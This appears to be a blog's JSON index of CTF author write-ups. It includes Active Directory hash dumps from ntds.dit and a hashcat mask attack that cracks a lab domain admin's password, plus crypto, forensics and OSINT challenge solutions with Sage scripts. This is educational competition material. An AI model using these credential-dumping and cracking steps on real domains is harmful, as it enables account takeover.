Administrator:500:aad3b435b51404eeaad3b435b51404ee:1b921e44ea5dfd940c004044d4ef4cae::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn\u0026#39;t have hash information. [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: a802330d6d1dca4a57a459990af5e50e [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:1b921e44ea5dfd940c004044d4ef4cae::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b60be13c1c27a48e5c5afc10792afeab::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7f27814ee1fea90dc7495b265207db9d::: mssql_service:2102:aad3b435b51404eeaad3b435b51404ee:6092ca0e60d24f30d848a5def59d4753::: wolvctf.corp\\james:4101:aad3b435b51404eeaad3b435b51404ee:4c20abe87d36b9ad715fd5671545abb5::: wolvctf.corp\\emily:4102:aad3b435b51404eeaad3b435b51404ee:5c7a26ae4c40018fa1660cc2f1d82269::: wolvctf.corp\\john:4103:aad3b435b51404eeaad3b435b51404ee:d24c1456aefeab3eb911c8015b9f6ce4::: wolvctf.corp\\patrick:4104:aad3b435b51404eeaad3b435b51404ee:0311f96ce47c5cc21529fcc8375f9c2e::: wolvctf.corp\\katherine:4105:aad3b435b51404eeaad3b435b51404ee:89218e0b151209e9d4fa0768ea72c70d::: wolvctf.corp\\Amy:4106:aad3b435b51404eeaad3b435b51404ee:4aa4474c2886f6a796bd75eebe5ebf01::: wolvctf.corp\\jessica:4107:aad3b435b51404eeaad3b435b51404ee:8fcdcffba18f392df7aa291527290aff::: wolvctf.corp\\frank:4108:aad3b435b51404eeaad3b435b51404ee:b0212745c59fcf54f06ea501cd409ff5::: wolvctf.corp\\chris:4109:aad3b435b51404eeaad3b435b51404ee:253cfc1375d39308ab1bb935b44e2010::: wolvctf.corp\\renee:4110:aad3b435b51404eeaad3b435b51404ee:9b5109ef6dbc8086ed36a90c20aa1d48::: wolvctf.corp\\peter:4111:aad3b435b51404eeaad3b435b51404ee:4f3cde005948d4e4fb232c35014ccafb::: wolvctf.corp\\dan:4112:aad3b435b51404eeaad3b435b51404ee:e9d959da74f5c7590a80d635b36705a6::: ... From our bloodhound output, we know jessica is the domain admin. We want to focus on her NTLM hash:\nwolvctf.corp\\jessica:4107:aad3b435b51404eeaad3b435b51404ee:8fcdcffba18f392df7aa291527290aff::: 8fcdcffba18f392df7aa291527290aff Cracking Jessica\u0026rsquo;s password hash #If you want to view the raw bloodhound data, it will show the description for the Domain Admins Group that Jessica is a part of Members who are part of this group have passwords w then a c then a t and an f, curly bracket left, \u0026#39;bloodhound_is_cool_\u0026#39; (but all the \u0026#39;o\u0026#39;s are \u0026#39;0\u0026#39;s), then a city in all lowercase appended by 3 numbers (secret only you know), right curly bracket Take a word list that has a lot of cities, as such: https://github.com/kkrypt0nn/wordlists/blob/main/wordlists/security_question_answers/cities.txt\nLets modify the wordlist\nwith open(\u0026#34;cities.txt\u0026#34;, \u0026#34;r\u0026#34;) as file: cities = file.readlines() formatted_cities = [] for city in cities: city = \u0026#34;wctf{bl00dh0und_is_c00l_\u0026#34; + city.strip().lower() formatted_cities.append(city) with open(\u0026#34;cities_wordlist.txt\u0026#34;, \u0026#34;w\u0026#34;) as file: for formatted_city in formatted_cities: file.write(formatted_city + \u0026#34;\\n\u0026#34;) print(\u0026#34;Formatted cities have been written to cities_wordlist.txt\u0026#34;) And crack using a hashcat masking rule to append 3 digits to the end of it\nhashcat -a 6 -m 1000 jessica.hash cities_wordlist.txt \u0026#34;?d?d?d}\u0026#34; ┌──(kali㉿kali)-[~/ctf/Active] └─$ hashcat -a 6 -m 1000 jessica.hash cities_wordlist.txt \u0026#34;?d?d?d}\u0026#34; hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================================ * Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i7-1280P, 1424/2913 MB (512 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 INFO: All hashes found as potfile and/or empty entries! Use --show to display them. Started: Wed Mar 19 01:41:52 2025 Stopped: Wed Mar 19 01:41:53 2025 ┌──(kali㉿kali)-[~/ctf/Active] └─$ hashcat -a 6 -m 1000 jessica.hash cities_wordlist.txt \u0026#34;?d?d?d}\u0026#34; --show 8fcdcffba18f392df7aa291527290aff:wctf{bl00dh0und_is_c00l_votuporanga985} Flag:\nwctf{bl00dh0und_is_c00l_votuporanga985} Active Video Walkthrough #Video to show the attacker\u0026rsquo;s POV to create the Active challenges\n","date":"29 March 2022","permalink":"/posts/wolvctf-2025/","section":"Posts","summary":"\u003cp\u003eAuthor writeups for my 6 individual challenges\u003c/p\u003e","title":"WolvCTF 2025"},{"content":"Author writeups for my 4 challenges in Crypto, Forensics, and OSINT\nANYTHING [Crypto] [241 solves]\nRSA Frustration [Crypto] [12 solves]\nNoise [Forensics] [18 solves]\nWhere in the world? [OSINT] [39 solves]\nANYTHING #Category: Crypto\nDifficulty: Easy\nPoints: 100\nSolves: 241\nChallenge Description: This could be encrypted with ANYTHING! wfa{oporteec_gvb_ogd}\nApproach #1.The flag seems to be encrypted by some 1:1 cipher, since there are still 3 letters before the flag. The challenge name and description imply that the word “Anything” might be useful to help decrypt this msg. Since the first letter is not encrypted, and the first letter of anything is an A, one might be able to deduce that this is a vigenere cipher. Putting it through a vigenere cipher on dcode yields the following results:\nflag: wsc{vigenere_not_bad}\nRSA Frustration #Category: Crypto\nDifficulty: Hard\nPoints: 499\nSolves: 12\nChallenge Description: My friend encrypted the flag but realized they can’t decrypt it. Frustrated, they decided to keep encrypting the flag hoping this will somehow fix it. How are we going to recover it now? An efficient solution would probably be useful here.\nFiles #from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes def encrypt(numToEncrypt): def getPrimeCustom(bitLength, e): while True: i = getPrime(bitLength) if (i-1) % e**2 == 0: return i global e global C bitLength = ((len(bin(numToEncrypt)) - 2) // 2) + 9 e = 113 p = getPrimeCustom(bitLength, e) q = getPrimeCustom(bitLength, e) N = p * q print(f\u0026#34;N = {N}\u0026#34;) C = pow(numToEncrypt, e, N) return C msg = b\u0026#34;wsc{????????????????????}\u0026#34; numToEncrypt = bytes_to_long(msg) # maybe if I keep encrypting it will fix itself??? # surely it won\u0026#39;t make it worse encryptedNum = encrypt(numToEncrypt) for x in range(26): encryptedNum = encrypt(encryptedNum) print(f\u0026#34;e = {e}\u0026#34;) print(f\u0026#34;C = {C}\u0026#34;) RSA_Frustration output\nApproach #The idea for this challenge stemmed from Dice CTF\u0026rsquo;s recent RSA challenge!\nBased off the description, the person is having trouble decrypting their flag. This means something is broken with the algorithm. We can see that the encryption script is choosing primes that are divisible by the second power of e, meaning phi is not coprime to e!. This will cause a decryption using the inverse mod of the ciphertext to not be useful.\nTherefore, we have to use a solution similar to Dice CTF\u0026rsquo;s where we take all candidate decryptions using the nth root algorithm in sage.\nStep 1: We need all p and q values of the Ns. This can take a long time to generate since the largest N is 199 digits long. To accommodate for this, I uploaded the factors to FactorDB. An algorithm that fetches the primes from factor DB can be used, or just manually doing it since there are only 27 Ns to factor.\nStep 2: We are given the encrypted ciphertext after 27 encryptions, so we have to start by using the largest N\u0026rsquo;s p and q values and the nth root algorithm to get possible p and q roots. We use the Chinese remainder theorem with the p and q roots to give us possible candidate decryptions, for which there will be e^2 of (12769 in this case).\nStep 3: We are then going to have to construct an algorithm to keep recursing through the possible candidate decryptions, using the correct p and q values based on the depth of the recursion. A depth first search (DFS) is most useful here to get the flag quicker. Using OPz qt\u0026rsquo;s DFS Sage Script we can get the flag!\nfrom Crypto.Util.number import long_to_bytes from sage.all import * e = 113 cipher = 289223688898876062358163081273625341952297233921219593553513840208424403509027574309712966219651401244239931354412620786106157789544225699742107659898527749034941786967678022482729534370307963310016 N_list = [1134876149917575363176366704410565158549594427794901202977560677131703617, 68506321231437453734007374706367120760326482177047006099953454136095248103663, 7783503593765446343363083302704731608384677185199537317445372251030064778965500447, 1070135687488356161164202697449500843725645617129661751744246979913699130211505096520493, 84012402115704505952834528733063574032699054524475028392540927197962976150657887637275643641, 4497278582433699034700211877087309784829036823057043402314297478185216205338241432310114079123771, 222438508972972285373674471797570608108219830357859030918870564627162064662598790037437036093579139489, 19116847751264029874551971240684579996570601026679560309305369168779130317938356692609176166515369250878437, 1549903986709797721131070830901667744892392382636347158789834851868638863292232718716074359148785900673192362699, 62387766690725996279968636478698222263235233511074646032501495855928095611796694112573478405813305623307157261619643, 1496134688150941811618178638810353297864345150241986530472328508974364124440160181353848429438725939837967063441528305921, 128744123633657656499069966444992201456797762973822340505291131642660343436783413140023509983315177426811890315424928661125061, 6917342652058596217869122177298094984415751234677039849514181349685079073411591975537016273056773954075238307918266361998553646469, 1999306851167477770905800721615579416365273707414308684419794311809177595829473632853128686208533753019224536487399393397120864878000113, 138594056023048386926766329537127538558164718841925506735112367176642328352257472034381662493666299220910783237918231719166519833124529218331, 8397272388904583425531462714999219642572091279898695377838194583995214737828538895164195817973441184775814069396690436662985593377966417476040659, 83372889332166088651413254885376085265561130214754686361784964744744711092668473281132249352040520639092871294276293287744276919265091479681667169671, 10684953914628370830889219903654707140968094024767031366624595731918523435466123514094659595357231410471738736952266383928737163485550013190959149252435167, 428359134899960532964729749713513106760306719712194950954567619156985067322564731294653991204666853689688900339268764469280769569535109069729404621290809120793, 24491413133428851306933688733518898516890217803647806829002775935975741568422047344206442746983871735723486865901743352102305801200224958166496937663406627341150101, 2247517335600310176909964109060502815240207684510918447209767597511414934626668616704865548059751008841620288545344598917362752622130186820039265603312354963258673860579, 157978379942536176944325875241196121764116712487226808271002140500926678942090491383544034591205964958130852055691446362753906164711087278555153881606839791499207025307202087, 43938571869497484913682975192955012614794498816057204091016374302341854100775132924321569876797699342959191646206571444845883942305710956894334106963321644724361549027630634869933, 2609065298534470914730686454716224905333131812890643378630636043224255484662185236061585264231004975072801053316107165770342161619265243081616632312934742288262985830181883449780965531, 222235907202454132555071455958700740228567465616560859711214102245461514428187391909176054661864893645713338391509536653547350134615807194339839952004333949540567943568810413945779642106201, 44890472824427626252451120059527486677662371033945481542195354255473403815853320591468917295474578271680865394304946847791535710766947049195816261224382109115684638995528332538466194474846836399, 1062789633774349417938788353001516763303743389381120380522262327123099728631034935663418832664265833959487018276693680850987382421521055508477988016246558095545925414048663082368488342633334571240563] p_list = [1189933229053113361422958527792232151, 295185057334340451492588650872876746227, 88380889077762105057154017276462714444697, 43974782968656404951924524450501283426052127, 7832299017937880395583715032476962329929226581, 1656848589754467667368312855929759764100120657831, 385788223643735590500185001710758495904528462058461, 135813272566456906193934636644217527100917542578856697, 41680117092754807988080699273322244961911189757589699867, 9419832152875820180139633405089278278408407453522978357309, 1567597041534155679238655992215022394597376421096298363211067, 350121371461894793578110243222665782247737840410076591434903787, 103424977238409568447978495499643051307907366367259219393937014631, 43449898447639409732732812916430042263570178747794530133229640125923, 12445294229358634680867170058509842935273054334385354032543323581223253, 3200631836176555526009533059891690177091538103904679780020639896015937897, 317277895959173163347650321012213555955385929418622006880521870012130207557, 102366458668689911004027849640392002821642295855327735994412634235696717329671, 26984206512970181742033712455904984758134288864531714209886622060356697128804201, 4479430800690915874719403516331677127806963529247809966024777708496270901092401687, 1328165608715012145707239303399129070657427496129541416861187541092152796676371237057, 368461902207817023013078031477042541053987571003677386333567043030477451518424731838173, 206721456778089912780641186795393376537372828449722520397829606593267585681448641482345737, 59471978701477648587546053450213894562580907285714122639903144859545186463681183925646967041, 15115713372931874518523751684548940147062395364112500028355694776530968944848166318295947674571, 5952590790902091635268726673538951527433355660839816621733964706901441977862333411532558667717227, 1086686910531802445146659484012613083647370307628438760118376029969836222533970554565751069314622539] q_list = [953730950786751671162019537171974567, 232079231415308325450092906880606082069, 88067722275537586769787599991567203589751, 24335212484189159197840692460327461505035059, 10726403821316775206273675267109184566904426261, 2714357008989072105081411295741540337141142641741, 576581905150085393327734090419529952232186498060949, 140758317578347635848563045232314610161039815135897421, 37185691759470013533730603170661686570987787098353146897, 6623023178993627032758350846838617937710601663528839184727, 954412804126450754097808991490470782833291028309980575506163, 367712839396521757736384350030802803477965822058616833553305103, 66882708962198932251728043152245270662769508317424500666902658099, 46014074200352892806829193743016415423205917845271691428043440245531, 11136261905010083405430254612464029672882837025885682392810368001188527, 2623629589005115152329094552749299711026240699896424120660145647226563547, 262775599542220820608778738911414710660835549772895468394761119434220071003, 104379442774418262390337411577160146519860415840398189010112686742489182665577, 15874438801602936764330936047390981280096007684699625987478211613419079727910193, 5467527956822382309398095704409409074818664888285375307055715842283183939297839923, 1692196606246085729483398884059069884182535824953762329164855466589577530953493347747, 428750921047556327595864876619292414694543668237320723518704707914310601565770504401619, 212549643149353357950643557614966235999942509894271006476145929120541407503538644651435909, 43870497594014737833600078975099212558645315030912084285417550950854483979406797450479252891, 14702310219802004876082313481498680940324963613770096574742182597840558294030859405666549879531, 7541333580839789645678699855290145212677767915429008863004397257213367753100058966625356835737037, 978009050697262759337388871320370165458800566798280419667959552859180906066907114053826258140106617] def factorize(p,q,N,depth,cip): assert p * q == N p_roots = mod(cip, p).nth_root(e, all=True) q_roots = mod(cip, q).nth_root(e, all=True) for xp in p_roots: for xq in q_roots: x = crt([Integer(xp), Integer(xq)], [p,q]) x = int(x) flag = long_to_bytes(x) #print(flag) if flag.startswith(b\u0026#34;wsc\u0026#34;): print(flag.decode()) if depth != 26: factorize(p_list[len(p_list) - 1 - (depth + 1)], q_list[len(q_list) - 1 - (depth + 1)], N_list[len(q_list) - 1 - (depth + 1)], (depth + 1), x) if __name__ == \u0026#34;__main__\u0026#34;: factorize(p_list[len(p_list) - 1], q_list[len(q_list)-1], N_list[len(q_list)-1], 0, cipher) flag: wsc{s4g3m4th_i5_5up3r_co0l!}\nThe Optimization: The above solution was able to find the flag, however, we can make this even faster. Since the encryption added 9 more bits to the minimum size p and q could be bitLength = ((len(bin(numToEncrypt)) - 2) // 2) + 9, this means we don\u0026rsquo;t have to DFS through 12769 candidate decryptions each time but actually just a couple or even sometimes 1! The algorithm below gets all candidate decryptions, and only chooses the smallest one for ciphers \u0026gt; 400 bits, smallest 5 for ciphers \u0026gt; 350 bits and smallest 10 for the rest. This will save about a minute\u0026rsquo;s time (on my machine) when trying to find the flag.\nfrom Crypto.Util.number import long_to_bytes from sage.all import * e = 113 cipher = 289223688898876062358163081273625341952297233921219593553513840208424403509027574309712966219651401244239931354412620786106157789544225699742107659898527749034941786967678022482729534370307963310016 N_list = [1134876149917575363176366704410565158549594427794901202977560677131703617, 68506321231437453734007374706367120760326482177047006099953454136095248103663, 7783503593765446343363083302704731608384677185199537317445372251030064778965500447, 1070135687488356161164202697449500843725645617129661751744246979913699130211505096520493, 84012402115704505952834528733063574032699054524475028392540927197962976150657887637275643641, 4497278582433699034700211877087309784829036823057043402314297478185216205338241432310114079123771, 222438508972972285373674471797570608108219830357859030918870564627162064662598790037437036093579139489, 19116847751264029874551971240684579996570601026679560309305369168779130317938356692609176166515369250878437, 1549903986709797721131070830901667744892392382636347158789834851868638863292232718716074359148785900673192362699, 62387766690725996279968636478698222263235233511074646032501495855928095611796694112573478405813305623307157261619643, 1496134688150941811618178638810353297864345150241986530472328508974364124440160181353848429438725939837967063441528305921, 128744123633657656499069966444992201456797762973822340505291131642660343436783413140023509983315177426811890315424928661125061, 6917342652058596217869122177298094984415751234677039849514181349685079073411591975537016273056773954075238307918266361998553646469, 1999306851167477770905800721615579416365273707414308684419794311809177595829473632853128686208533753019224536487399393397120864878000113, 138594056023048386926766329537127538558164718841925506735112367176642328352257472034381662493666299220910783237918231719166519833124529218331, 8397272388904583425531462714999219642572091279898695377838194583995214737828538895164195817973441184775814069396690436662985593377966417476040659, 83372889332166088651413254885376085265561130214754686361784964744744711092668473281132249352040520639092871294276293287744276919265091479681667169671, 10684953914628370830889219903654707140968094024767031366624595731918523435466123514094659595357231410471738736952266383928737163485550013190959149252435167, 428359134899960532964729749713513106760306719712194950954567619156985067322564731294653991204666853689688900339268764469280769569535109069729404621290809120793, 24491413133428851306933688733518898516890217803647806829002775935975741568422047344206442746983871735723486865901743352102305801200224958166496937663406627341150101, 2247517335600310176909964109060502815240207684510918447209767597511414934626668616704865548059751008841620288545344598917362752622130186820039265603312354963258673860579, 157978379942536176944325875241196121764116712487226808271002140500926678942090491383544034591205964958130852055691446362753906164711087278555153881606839791499207025307202087, 43938571869497484913682975192955012614794498816057204091016374302341854100775132924321569876797699342959191646206571444845883942305710956894334106963321644724361549027630634869933, 2609065298534470914730686454716224905333131812890643378630636043224255484662185236061585264231004975072801053316107165770342161619265243081616632312934742288262985830181883449780965531, 222235907202454132555071455958700740228567465616560859711214102245461514428187391909176054661864893645713338391509536653547350134615807194339839952004333949540567943568810413945779642106201, 44890472824427626252451120059527486677662371033945481542195354255473403815853320591468917295474578271680865394304946847791535710766947049195816261224382109115684638995528332538466194474846836399, 1062789633774349417938788353001516763303743389381120380522262327123099728631034935663418832664265833959487018276693680850987382421521055508477988016246558095545925414048663082368488342633334571240563] p_list = [1189933229053113361422958527792232151, 295185057334340451492588650872876746227, 88380889077762105057154017276462714444697, 43974782968656404951924524450501283426052127, 7832299017937880395583715032476962329929226581, 1656848589754467667368312855929759764100120657831, 385788223643735590500185001710758495904528462058461, 135813272566456906193934636644217527100917542578856697, 41680117092754807988080699273322244961911189757589699867, 9419832152875820180139633405089278278408407453522978357309, 1567597041534155679238655992215022394597376421096298363211067, 350121371461894793578110243222665782247737840410076591434903787, 103424977238409568447978495499643051307907366367259219393937014631, 43449898447639409732732812916430042263570178747794530133229640125923, 12445294229358634680867170058509842935273054334385354032543323581223253, 3200631836176555526009533059891690177091538103904679780020639896015937897, 317277895959173163347650321012213555955385929418622006880521870012130207557, 102366458668689911004027849640392002821642295855327735994412634235696717329671, 26984206512970181742033712455904984758134288864531714209886622060356697128804201, 4479430800690915874719403516331677127806963529247809966024777708496270901092401687, 1328165608715012145707239303399129070657427496129541416861187541092152796676371237057, 368461902207817023013078031477042541053987571003677386333567043030477451518424731838173, 206721456778089912780641186795393376537372828449722520397829606593267585681448641482345737, 59471978701477648587546053450213894562580907285714122639903144859545186463681183925646967041, 15115713372931874518523751684548940147062395364112500028355694776530968944848166318295947674571, 5952590790902091635268726673538951527433355660839816621733964706901441977862333411532558667717227, 1086686910531802445146659484012613083647370307628438760118376029969836222533970554565751069314622539] q_list = [953730950786751671162019537171974567, 232079231415308325450092906880606082069, 88067722275537586769787599991567203589751, 24335212484189159197840692460327461505035059, 10726403821316775206273675267109184566904426261, 2714357008989072105081411295741540337141142641741, 576581905150085393327734090419529952232186498060949, 140758317578347635848563045232314610161039815135897421, 37185691759470013533730603170661686570987787098353146897, 6623023178993627032758350846838617937710601663528839184727, 954412804126450754097808991490470782833291028309980575506163, 367712839396521757736384350030802803477965822058616833553305103, 66882708962198932251728043152245270662769508317424500666902658099, 46014074200352892806829193743016415423205917845271691428043440245531, 11136261905010083405430254612464029672882837025885682392810368001188527, 2623629589005115152329094552749299711026240699896424120660145647226563547, 262775599542220820608778738911414710660835549772895468394761119434220071003, 104379442774418262390337411577160146519860415840398189010112686742489182665577, 15874438801602936764330936047390981280096007684699625987478211613419079727910193, 5467527956822382309398095704409409074818664888285375307055715842283183939297839923, 1692196606246085729483398884059069884182535824953762329164855466589577530953493347747, 428750921047556327595864876619292414694543668237320723518704707914310601565770504401619, 212549643149353357950643557614966235999942509894271006476145929120541407503538644651435909, 43870497594014737833600078975099212558645315030912084285417550950854483979406797450479252891, 14702310219802004876082313481498680940324963613770096574742182597840558294030859405666549879531, 7541333580839789645678699855290145212677767915429008863004397257213367753100058966625356835737037, 978009050697262759337388871320370165458800566798280419667959552859180906066907114053826258140106617] def lenTable(cip): bitLen = len(bin(cip)) - 2 if bitLen \u0026gt; 400: return 1 elif bitLen \u0026gt; 350: return 5 else: return 10 def factorize(p,q,N,depth,cip): assert p * q == N p_roots = mod(cip, p).nth_root(e, all=True) q_roots = mod(cip, q).nth_root(e, all=True) s1 = list() for xp in p_roots: for xq in q_roots: x = crt([Integer(xp), Integer(xq)], [p,q]) x = int(x) if len(s1) \u0026lt; lenTable(cip): s1.append(x) elif x \u0026lt; s1[0]: s1[lenTable(cip) - 1] = x s1.sort() flag = long_to_bytes(x) if flag.startswith(b\u0026#34;wsc\u0026#34;): print(flag.decode()) if depth != 26: for num in s1: factorize(p_list[len(p_list) - 1 - (depth + 1)], q_list[len(q_list) - 1 - (depth + 1)], N_list[len(q_list) - 1 - (depth + 1)], (depth + 1), num) if __name__ == \u0026#34;__main__\u0026#34;: factorize(p_list[len(p_list) - 1], q_list[len(q_list)-1], N_list[len(q_list)-1], 0, cipher) Notes #The initial idea was to make the optimization needed to find the flag, however this would likely lead to people with very great computing power to be able to still use the sole DFS algorithm without the e optimization. Therefore, the optimization is just a bonus idea. It is most useful when trying to replicate the results of the challenge. Sage remembers factors, so when running the scripts a second time the non-optimized one takes a minute whereas the optimized one takes 5 seconds on my machine. Maybe someone could force this optimization in a challenge of their own! If 10 bits were added instead of 9 then we would not even need a DFS, and could do it linear with the smallest candidate decryption each time. However, the idea for this challenge was to incorporate a DFS but to be able to use the optimization as assistance.\nNoise #Category: Forensics\nDifficulty: Medium\nPoints: 498\nSolves: 18\nChallenge Description: My buddy sent me this totally RAW clip of them playing guitar. Doesn’t sound quite right to me, something might be off. Also don’t listen with headphones at the end!\nApproach #This challenge was based off of Joshua Casper\u0026rsquo;s steganography idea!\nWhile listening to the audio file, you can hear the audio has gotten corrupted towards the end of the recording.\nIf you run strings on the file, it will output hidden comments:\nThis is hinting that you will need to view this as a raw file in photoshop. This is also hinted in the description with RAW being capitalized. To convert it to a raw file, change the file extension from \u0026ldquo;.wav\u0026rdquo; to \u0026ldquo;.raw\u0026rdquo;. Then, when trying to open the file in photoshop you are presented with the following options:\nFrom the hint, we are given that the channels should be set to 1 and the depth should be set to 8 bits. These are also the default settings, so the hint was not necessarily needed.\nflag: wsc{t0t4lly_w1ck3d_dud3}\nNote #At least one team was able to do this without the use of photoshop, and just online tools.\nWhere in the world? #Category: OSINT\nDifficulty: Medium\nPoints: 486\nSolves: 39\nChallenge Description: User Vividpineconepig claims on to live next to a street that\u0026rsquo;s above some train tracks. Where are they? Maybe finding their social media could help. We’ll give you a flag for tracking them down. Give us this elevated STREETNAME preceding the St/Rd/Ave/Lane to prove it.\nFormat: wsc{STREETNAME}\nApproach #Vividpineconepig appears to be the name of some unique user. The description tells us we might want to find their social media account. Using tools like Sherlock we can find possible social media accounts of unique users. Once we try instagram, we find the following account and picture:\nOne might initially think that we are going to need to brute force search the location, but we can actually narrow down this location using the two main clues in the picture. After doing research, one would find that the Adopt a Highway sign on the right is exclusive to the state on Montana. The other major clue is the Mile 280 mile marker. Since we know the state is Montana, one might find this Montana\u0026rsquo;s DOT Mile Marker map to be useful. There are now very little locations you would have to check on programs such as google maps.\nOnce we find that the town is Shelby, MT, the next step is finding the streetname. From the picture, we might consider this elevated street over the traintracks to be the street the description is referring to.\nLooking on google maps, we can find the most updated street name (NOTE: If you check on google street view, it will give you an older name of the street, which is incorrect):\nHere, we can see the street is Oilfield Ave.\nflag: wsc{OILFIELD}\nShoutout to the USA Geoguessr community! would not have all adopt a highway signs memorized without them :)\n","date":"29 March 2022","permalink":"/posts/wolvsec-ctf-2022/","section":"Posts","summary":"\u003cp\u003eAuthor writeups for my 4 challenges in Crypto, Forensics, and OSINT\u003c/p\u003e","title":"WolvSec CTF 2022"},{"content":"","date":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"}]